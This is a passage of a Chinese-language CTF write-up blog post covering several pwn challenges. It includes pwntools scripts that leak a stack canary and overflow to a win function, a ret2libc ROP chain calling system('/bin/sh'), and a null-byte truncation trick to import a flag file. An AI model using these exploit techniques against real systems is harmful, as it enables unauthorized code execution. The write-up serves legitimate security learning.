(check_valid(game_grid)) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">  <span class="keyword">while</span> ((ch = fgetc(<span class="built_in">stdin</span>)) != EOF &amp;&amp; ch != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">  <span class="type">time_t</span> end;</span><br><span class="line">  time(&amp;end);</span><br><span class="line">  last = end - begin;</span><br><span class="line"></span><br><span class="line">  vuln();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>D0相当简单，做完后就老老实实给你shell了，算是pwn签到题</p>
<h3 id="WMC25-D1"><a href="#WMC25-D1" class="headerlink" title="WMC25 D1"></a>WMC25 D1</h3><ul>
<li>Author:kuroko</li>
<li>Difficulty:Easy</li>
<li>Category:Pwn</li>
</ul>
<p>这一回题目没调用win函数了，需要通过栈溢出的方法来进行调用，先用checesc看看开了什么保护：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   61 Symbols     Yes      0      2pwn</span><br></pre></td></tr></table></figure></div>

<p>开了canary的栈溢出保护，但还好没有开随机化。有没有什么方法可以绕过这个保护位呢？</p>
<blockquote>
<p>Canary 的意思是金丝雀🦜，英国矿井工人们每次下井都会带上一只金丝雀，如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。<br>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。当启用栈溢出保护后，函数开始执行的时候会先往栈底插入一段cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。</p>
</blockquote>
<p>其实也不麻烦，程序使用了<code>read(0, buf, 0x408);</code>这个不安全的函数，允许我们读入0x408长度的字符串。那我们只要覆盖到canary低位的0x00，printf自然就会帮助我们在打印名次的时候自动也把canary打印出来，从而获得canary的值，然后通过栈溢出覆盖，这样就可以达到更改返回地址和$rbp寄存器，达到进入函数目的。</p>
<p>总之，我们需要做的就是先用IDA逆向看到buffer距离栈底的距离，然后构造合适的字符串进行覆盖获取到canary，之后再把名字+canary+返回地址拼接起来就可以去到win函数了。</p>
<p>有一些细节处理需要注意：首先这个函数会判断长度是否合法，不然不会返回，所以要在中间加上一个”\0”通过验证，第二个是system()函数的指令要求栈对齐不然会提前退出，简单的解决方法是在注入地址的时候手动加大地址进行对齐就好，最终payload如下：</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ops = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1 A 1</span></span><br><span class="line"><span class="string">1 E 1</span></span><br><span class="line"><span class="string">2 E 1</span></span><br><span class="line"><span class="string">3 E 1</span></span><br><span class="line"><span class="string">4 E 1</span></span><br><span class="line"><span class="string">4 D 1</span></span><br><span class="line"><span class="string">3 D 1</span></span><br><span class="line"><span class="string">5 D 1</span></span><br><span class="line"><span class="string">5 E 1</span></span><br><span class="line"><span class="string">5 C 1</span></span><br><span class="line"><span class="string">1 B 2</span></span><br><span class="line"><span class="string">1 C 2</span></span><br><span class="line"><span class="string">2 A 2</span></span><br><span class="line"><span class="string">2 B 2</span></span><br><span class="line"><span class="string">2 D 2</span></span><br><span class="line"><span class="string">2 C 2</span></span><br><span class="line"><span class="string">4 B 2</span></span><br><span class="line"><span class="string">4 C 2</span></span><br><span class="line"><span class="string">5 B 2</span></span><br><span class="line"><span class="string">5 A 2</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">canary_next = <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_canary</span>(<span class="params">canary: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;[c <span class="keyword">for</span> c <span class="keyword">in</span> canary]&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    sh = remote(<span class="string">&quot;172.31.80.1&quot;</span>, <span class="string">&quot;24747&quot;</span>)</span><br><span class="line">    <span class="comment"># sh = process(&quot;./pwn&quot;)</span></span><br><span class="line">    sh.send(ops.encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;Please sign your name:&quot;</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    </span><br><span class="line">    canary = u64(sh.recvn(<span class="number">8</span>)) - <span class="number">0x0a</span></span><br><span class="line">    <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">    log.success(<span class="string">f&quot;Canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;Just give us another shorter nickname:&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    sh.send(<span class="string">b&#x27;A&#x27;</span>*<span class="number">9</span> + <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*<span class="number">14</span> + p64(canary) + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0x4012BB</span>)) <span class="comment">#watchout: byte align</span></span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test_canary(canary)</span><br></pre></td></tr></table></figure></div>

<p>最后得出flag：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/vcDJBYfQbGOe7kA.png"
                      alt="image-20250505203106744"
                ></p>
<h3 id="WMC25-D2"><a href="#WMC25-D2" class="headerlink" title="WMC25 D2"></a>WMC25 D2</h3><ul>
<li>Author:kuroko</li>
<li>Difficulty:Normal</li>
<li>Category:Pwn</li>
</ul>
<p>这道题该开的保护全开了，PIE也开了随机化，并且win函数也不见了，这该怎么办呢？</p>
<p>别急，我们可以看到题目给我们提供了一些必要的库，我们先把这些库和链接器链接起来：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn</span><br><span class="line">patchelf --set-interpreter ld-linux.so.2 ./pwn</span><br></pre></td></tr></table></figure></div>

<p>通常给我们的这些库中都有很多指令片段，我们可以利用这些指令片段构造Gadget，然后通过这些Gadget给寄存器传递参数，在最后返回我们需要的函数地址，就可以达到实现类似function(0x12345678, 0x1234abcd)，从而执行库中函数的目的啦<del>初看确实有点像黑魔法</del></p>
<p>知道了怎么做，由于这一题开了随机化，所以我们还要确定代码片段的地址，栈上有很多数据，其中还包括了主程序的地址，各类库的地址，它们因为局部变量，返回地址保存等等原因留在栈上，我们可以把一些函数的地址泄露出来，由于这些地址和libc库加载的基地址的相对位置是确定的，那我们只用把它的地址减去它相对地址就可以得到基础地址了。（相对地址计算可以在gef里面使用vmmap查看基地址然后手动计算）</p>
<p>最后，lic中的text段肯定也存有像是”&#x2F;bin&#x2F;sh”的字符串，把这些结合起来，我们就可以得到一个调用system(“bin&#x2F;sh”)的链条了！</p>
<p>具体的payload如下：</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ops = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">5 D 1</span></span><br><span class="line"><span class="string">5 C 1</span></span><br><span class="line"><span class="string">5 B 1</span></span><br><span class="line"><span class="string">4 C 1</span></span><br><span class="line"><span class="string">4 B 1</span></span><br><span class="line"><span class="string">4 A 1</span></span><br><span class="line"><span class="string">5 A 1</span></span><br><span class="line"><span class="string">3 A 2</span></span><br><span class="line"><span class="string">3 B 1</span></span><br><span class="line"><span class="string">3 C 1</span></span><br><span class="line"><span class="string">4 D 1</span></span><br><span class="line"><span class="string">4 E 2</span></span><br><span class="line"><span class="string">2 A 1</span></span><br><span class="line"><span class="string">1 A 2</span></span><br><span class="line"><span class="string">1 B 2</span></span><br><span class="line"><span class="string">1 C 2</span></span><br><span class="line"><span class="string">1 D 1</span></span><br><span class="line"><span class="string">3 E 1</span></span><br><span class="line"><span class="string">1 E 2</span></span><br><span class="line"><span class="string">2 B 2</span></span><br><span class="line"><span class="string">2 C 2</span></span><br><span class="line"><span class="string">2 D 2</span></span><br><span class="line"><span class="string">3 D 2</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">canary_next = <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_canary</span>(<span class="params">canary: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;[c <span class="keyword">for</span> c <span class="keyword">in</span> canary]&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    sh = remote(<span class="string">&quot;172.31.80.1&quot;</span>, <span class="string">&quot;30045&quot;</span>)</span><br><span class="line">    <span class="comment"># sh = process(&quot;./pwn&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">    sh.send(ops.encode())</span><br><span class="line">    <span class="comment"># sh.interactive()</span></span><br><span class="line">    </span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;You win! Please sign your name: &quot;</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">0x18</span>)</span><br><span class="line">    </span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    </span><br><span class="line">    canary = u64(sh.recvn(<span class="number">8</span>)) - <span class="number">0x0a</span></span><br><span class="line">    <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">    log.success(<span class="string">f&quot;Canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    sh.sendafter(<span class="string">b&quot;Just give us another shorter nickname:&quot;</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">0x68</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&quot;A&quot;</span> * <span class="number">0x68</span>)</span><br><span class="line">    libc_start_main = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = libc_start_main - <span class="number">0x29d90</span></span><br><span class="line">    </span><br><span class="line">    log.success(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    binsh = libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">9</span> + <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*<span class="number">14</span> + p64(canary) + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span></span><br><span class="line">    payload += p64(libc_base + <span class="number">0x000000000002a3e5</span>) </span><br><span class="line">    payload += p64(libc_base + binsh)</span><br><span class="line">    payload += p64(libc_base + <span class="number">0x000000000002a3e6</span>) </span><br><span class="line">    payload += p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]) </span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;Just give us another shorter nickname:&quot;</span>,payload)</span><br><span class="line">    </span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test_canary(canary)</span><br></pre></td></tr></table></figure></div>

<p>最后得出flag如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/1sN2hng36quiQoW.png"
                      alt="image-20250505203141648"
                ></p>
<h3 id="白井黑子"><a href="#白井黑子" class="headerlink" title="白井黑子"></a>白井黑子</h3><p>先放 payload，巨简单：</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> kuroko</span><br><span class="line">kuroko.importmodule(<span class="string">&quot;flag\0&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/Xhoker4ZnUgGH5K.png"
                      alt="image-20250504215926145"
                ></p>
<p>因为提示说跟 import 有关，跟 import 有关的函数一共就俩，一个 import module 一个 load module，那就都看看呗，其实挺明显的，漏洞大概是这个地方：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/yP2opX8MRkls1CG.png"
                      alt="image-20250504221122804"
                ></p>
<p>这项目是 python 方言，我看了下 import 这一块机制跟 python 是完全一样的。python 的 import 的实现事实上是把目标文件执行一遍，然后收集执行完的 globals 放到字典里。已知 flag 文件就在同一个目录下，内容就是 flag，不是<code>krk</code>语法，但如果被当做<code>.krk</code>脚本执行的话会报错，在 traceback 里就能看到 flag。</p>
<p>接下来难点变成怎么 import flag 文件。</p>
<p>首先发现 kuroko.importmodule 可以 import 字符串。接下来把 import 相关的几个函数都研究了几遍，障碍在于 import 的时候会依次校验目标文件是不是几种规定的可 import 的东西，具体的校验方法很粗糙，比如说要 import mymod，那就用<code>stats()</code>看 <code>mymod.krk,mymod.so,mymod/__init__.py</code>这几个文件打不打得开。这几个文件名的构造用的是语言自己的字符串拼接方法，就是图中的 add 两个 str object 的部分。</p>
<p>现在没有<code>flag.krk</code>，只有<code>flag</code>，按理说是过不了校验的，没法 import。但是 hint 都说了就是要 import，方向肯定是对的，那就研究呗。</p>
<p>于是花了一些时间发现了图中 <code>AS_CSTRING</code>问题很大，可以用 0 字符截断，这样后面的<code>.krk</code>不会拼上去，只会校验<code>flag</code>文件存不存在，这个校验就过了。于是成功 import flag 文件，get。</p>
<h3 id="Sokopwn"><a href="#Sokopwn" class="headerlink" title="Sokopwn"></a>Sokopwn</h3><ul>
<li>Author: cbh</li>
<li>Difficulty: Normal</li>
<li>Category: Pwn</li>
</ul>
<p>体感上很奇怪的一道题，感觉一点也不pwn，并且也没那么难，可能是没找到pwn的解法（</p>
<p>IDA反编译后得出结论有四关，推箱子推出来就老老实实给你flag，可能智商太低玩不动推箱子，直接去网上找求解器了，之后就是很无聊的改地图，改步数之类的活了，最后payload如下：</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;1711&quot;</span>)</span><br><span class="line"></span><br><span class="line">ops = <span class="string">&quot;dddssddwwawwaaaassswwwddddssaaadddwwaaaassasdwdddssdwdwdwasaaaasaawdwwddddssaaadddwwaaaassasdwdddssdwdwaaaadddwwaaaass&quot;</span></span><br><span class="line">ops2 = <span class="string">&quot;ddddsdawwddsdwwsssaaaaawaasaaaawaasswddddaaassdddddsdddwaaddwwaawddwdsdwdsasaaadssaaaaaaasawsaww&quot;</span></span><br><span class="line"></span><br><span class="line">ops3 = <span class="string">&quot;wddssasassddwwawdsssawdwwwdwsdssawaasdssawdwwddddddwdwassaaaawwwwwdddwdssssaaaassaasssaaaaawwdwwwwwwddddddddaasssssddddwdwassaaaawwwwwdddwdsssswwwaaaasssssaassaawdssaaaawwdddaawwwwwwddddddddddsssaaddwwwaaaaaaaaaassssssassddwsaawwdwwwwwwddddddsssssaawwaawdsdssddwwwwwddddsssaaadddwwwaaaaaaaaaassssssassddwdddwwwsssaawdwdddddddwdwassaaaaaaassdwawdsssaaaaawwdwwwwwwddddddddddsssssaaaasadwddddwwwwwaaaaaaaaaassssssassddwdwdwddaasssaaaawwdddaaasdsdwdddwwssaawdsaaawddaawwwwwwddddddssswwwddddsssaaadddwwwaaaaaaaaaasssssssddddwsaawdwdasaaawwwwwwddddddddddsssaawasdddwwwaaaaaaaaaasssssssddddw&quot;</span></span><br><span class="line">ops4 = <span class="string">&quot;ddwwwwaaaaaaaassdsdsddddaaaasadwwwsssawdwwaaasssssdddwsaaawwwwwdddssassdsawwwdwwassswdddwaasddddwaasaawwaaassssssddwdwwawddddwdssssdsawwwwaaaawwaawwddssswaaassssssddwdwwawddddwdssssswaassdddwwwawwwaaasasssasaawwwwwwdddswaaassssssddwdwwawddddwdsssssdsaadwwwwwaaaaawdwwwaassdawwddsssasddddwdsssssdsawwwwwwaaaawwwddsawasssasddddwdsssasdwdsswwawwaaaasssawwwwdwwwaassdawwddsssasddddwdssssswwwwaaaasssasaawdsdwwwwwdwwwaassdawwddsssasddddwdsssasdwdsasdwwawwaaaasssaaawddsdwwawddddwdsssdsaawaswddwwaaaassaaawddsdwawddddwdsssasdwdswawwwaaaawwwddddsddsssadwwwwaaaasaassddddssss&quot;</span></span><br><span class="line">sh.send(ops.encode())</span><br><span class="line">sh.send(ops2.encode())</span><br><span class="line">sh.send(ops3.encode())</span><br><span class="line">sh.send(ops4.encode())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/9ufxM8eKPCcBpmv.png"
                      alt="image-20250505203003325"
                ></p>
<p><del>感谢Sokoban YASC还有sokolution，他们才是Master</del></p>
<h4 id="一些小小的碎碎念"><a href="#一些小小的碎碎念" class="headerlink" title="一些小小的碎碎念"></a>一些小小的碎碎念</h4><p>第一次参加CTF比赛，可以说度过了一个十分充实又快乐的五一假期，最后在强者中可以达到第五也确实大大超出了预期。</p>
<p>感谢我的两位队友，M厂的@榾-Woisol还有@undefined学长，都是web之神和造轮子之神，少了任何一人也不可能到现在这个名次，和大家在群里交流讨论也很开心，学习到了很多思想还有解题方法。</p>
<p>感谢WMC25系列还有其他题目的出题人，让我从比赛前什么都不懂，被自我怀疑和焦虑折磨的小白到慢慢看资料发现逼自己一把“还是可以做出某些东西的”，谢谢你们的热爱还有工作。</p>
<p>最后，感谢这个比赛的发起人以及平台开发者@GZTime学长，虽然错过了您的时代，但是您留下来的火种还在不断传给下一代，影响着更多人，也一直是我学习的榜样，这个世界需要更多的像您这样的传火者</p>
<p>总之，感谢大家，更感谢坚持下来的自己。</p>
]]></content>
      <tags>
        <tag>Competition</tag>
      </tags>
  </entry>
</search>
